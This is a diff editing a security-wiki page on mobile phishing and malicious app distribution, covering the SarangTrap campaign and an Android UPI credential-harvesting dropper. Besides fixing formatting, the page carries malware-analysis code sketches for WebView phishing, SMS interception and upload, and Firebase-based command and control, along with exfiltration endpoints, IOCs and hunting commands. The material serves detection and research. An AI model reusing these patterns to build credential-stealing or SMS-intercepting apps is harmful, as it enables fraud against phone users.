@@ -1,6 +1,5 @@
 # Mobile Phishing & Malicious App Distribution (Android & iOS)
 
-
 > [!INFO]
 > This page covers techniques used by threat actors to distribute **malicious Android APKs** and **iOS mobile-configuration profiles** through phishing (SEO, social engineering, fake stores, dating apps, etc.).
 > The material is adapted from the SarangTrap campaign exposed by Zimperium zLabs (2025) and other public research.
@@ -22,9 +21,9 @@
 4. **Runtime Permission Abuse** (Android)
    * Dangerous permissions are only requested **after positive C2 response**:
      ```xml
-     
-     
-     
+     <uses-permission android:name="android.permission.READ_CONTACTS"/>
+     <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE"/>
+     <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
      <!-- Older builds also asked for SMS permissions -->
      ```
    * Recent variants **remove `<uses-permission>` for SMS from `AndroidManifest.xml`** but leave the Java/Kotlin code path that reads SMS through reflection ⇒ lowers static score while still functional on devices that grant the permission via `AppOps` abuse or old targets.
@@ -33,7 +32,7 @@
    * Meanwhile it exfiltrates:
      - IMEI / IMSI, phone number
      - Full `ContactsContract` dump (JSON array)
-     - JPEG/PNG from `/sdcard/DCIM` compressed with [[https://github.com/Curzibn/Luban|Luban]] to reduce size
+     - JPEG/PNG from `/sdcard/DCIM` compressed with [Luban](https://github.com/Curzibn/Luban) to reduce size
      - Optional SMS content (`content://sms`)
      Payloads are **batch-zipped** and sent via `HTTP POST /upload.php`.
 6. **iOS Delivery Technique**
@@ -80,7 +79,7 @@ Java.perform(function() {
   };
 });
 ```
-```
+
 ## Indicators (Generic)
 
 ```
@@ -88,7 +87,7 @@ Java.perform(function() {
 /upload.php               # batched ZIP exfiltration
 LubanCompress 1.1.8       # "Luban" string inside classes.dex
 ```
-```
+
 ---
 
 ## Android WebView Payment Phishing (UPI) – Dropper + FCM C2 Pattern
@@ -112,7 +111,7 @@ unzip -l sample.apk | grep -i "assets/app.apk"
 # Or:
 zipgrep -i "classes|.apk" sample.apk | head
 ```
-```
+
 ### Dynamic endpoint discovery via shortlink
 - Malware fetches a plain-text, comma-separated list of live endpoints from a shortlink; simple string transforms produce the final phishing page path.
 
@@ -125,7 +124,7 @@ Transform: "gate.html" → "gate.htm" (loaded in WebView)
 UPI credential POST: https://sqcepo.replit.app/addup.php
 SMS upload:           https://sqcepo.replit.app/addsm.php
 ```
-```
+
 Pseudo-code:
 
 ```java
@@ -135,7 +134,7 @@ String upiPage = parts[0].replace("gate.html", "gate.htm");
 String smsPost = parts[1];
 String credsPost = upiPage.replace("gate.htm", "addup.php");
 ```
-```
+
 ### WebView-based UPI credential harvesting
 - The “Make payment of ₹1 / UPI‑Lite” step loads an attacker HTML form from the dynamic endpoint inside a WebView and captures sensitive fields (phone, bank, UPI PIN) which are `POST`ed to `addup.php`.
 
@@ -146,16 +145,14 @@ WebView wv = findViewById(R.id.web);
 wv.getSettings().setJavaScriptEnabled(true);
 wv.loadUrl(upiPage); // ex: https://<replit-app>/gate.htm
 ```
-```
+
 ### Self-propagation and SMS/OTP interception
 - Aggressive permissions are requested on first run:
 
 ```xml
 
-
-
 ```
-```
+
 - Contacts are looped to mass-send smishing SMS from the victim’s device.
 - Incoming SMS are intercepted by a broadcast receiver and uploaded with metadata (sender, body, SIM slot, per-device random ID) to `/addsm.php`.
 
@@ -174,7 +171,7 @@ public void onReceive(Context c, Intent i){
   }
 }
 ```
-```
+
 ### Firebase Cloud Messaging (FCM) as resilient C2
 - The payload registers to FCM; push messages carry a `_type` field used as a switch to trigger actions (e.g., update phishing text templates, toggle behaviours).
 
@@ -189,7 +186,7 @@ Example FCM payload:
   }
 }
 ```
-```
+
 Handler sketch:
 
 ```java
@@ -203,7 +200,7 @@ public void onMessageReceived(RemoteMessage msg){
   }
 }
 ```
-```
+
 ### Hunting patterns and IOCs
 - APK contains secondary payload at `assets/app.apk`
 - WebView loads payment from `gate.htm` and exfiltrates to `/addup.php`
@@ -222,8 +219,8 @@ public void onMessageReceived(RemoteMessage msg){
 
 ## References
 
-- [[https://zimperium.com/blog/the-dark-side-of-romance-sarangtrap-extortion-campaign|The Dark Side of Romance: SarangTrap Extortion Campaign]]
-- [[https://github.com/Curzibn/Luban|Luban – Android image compression library]]
-- [[https://www.mcafee.com/blogs/other-blogs/mcafee-labs/android-malware-promises-energy-subsidy-to-steal-financial-data/|Android Malware Promises Energy Subsidy to Steal Financial Data (McAfee Labs)]]
-- [[https://firebase.google.com/docs/cloud-messaging|Firebase Cloud Messaging — Docs]]
+- [The Dark Side of Romance: SarangTrap Extortion Campaign](https://zimperium.com/blog/the-dark-side-of-romance-sarangtrap-extortion-campaign)
+- [Luban – Android image compression library](https://github.com/Curzibn/Luban)
+- [Android Malware Promises Energy Subsidy to Steal Financial Data (McAfee Labs)](https://www.mcafee.com/blogs/other-blogs/mcafee-labs/android-malware-promises-energy-subsidy-to-steal-financial-data/)
+- [Firebase Cloud Messaging — Docs](https://firebase.google.com/docs/cloud-messaging)
 
